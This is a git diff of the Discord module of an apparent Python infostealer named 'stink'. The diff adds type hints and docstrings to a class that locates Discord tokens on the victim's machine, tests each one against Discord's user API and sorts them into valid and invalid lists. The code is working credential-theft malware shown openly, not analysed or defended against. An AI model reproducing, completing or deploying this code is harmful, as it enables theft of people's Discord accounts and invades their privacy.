@@ -1,6 +1,7 @@
 from re import findall
 from json import loads
 from threading import Thread
+from typing import MutableMapping
 from os import listdir, path, makedirs
 from urllib.request import Request, urlopen
 
@@ -8,7 +9,9 @@ from stink.helpers.config import DiscordConfig
 
 
 class Discord:
-
+    """
+    Collects tokens from the Discord.
+    """
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
         self.__storage_path = storage_path
@@ -17,15 +20,23 @@ class Discord:
 
         self.__config = DiscordConfig()
 
-    def __create_folder(self):
-
+    def __create_folder(self) -> None:
+        """
+        Creates storage for the Discord module.
+        :return: None
+        """
         folder = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(folder):
             makedirs(folder)
 
-    def __get_headers(self, token: str = None, content_type: str = "application/json"):
-
+    def __get_headers(self, token: str = None, content_type: str = "application/json") -> dict:
+        """
+        Composes the headers for the query.
+        :param token: str
+        :param content_type: str
+        :return: dict
+        """
         headers = {
             "Content-Type": content_type,
             "User-Agent": self.__config.UserAgent
@@ -36,16 +47,23 @@ class Discord:
 
         return headers
 
-    def __check_token(self, *args):
-
+    def __check_token(self, *args: MutableMapping[str, str]) -> None:
+        """
+        Checks token for validity.
+        :param args: [str, dict]
+        :return: None
+        """
         try:
             query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=args[1]))
             self.valid.append((args[0], query))
         except:
             self.invalid.append(args[0])
 
-    def __get_tokens(self):
-
+    def __get_tokens(self) -> None:
+        """
+        Collects all valid and invalid Discord tokens.
+        :return: None
+        """
         if not path.exists(self.__config.TokensPath):
             return
 
@@ -100,8 +118,11 @@ class Discord:
 
         discord.close()
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the Discord tokens collection module.
+        :return: None
+        """
         try:
 
             self.__get_tokens()
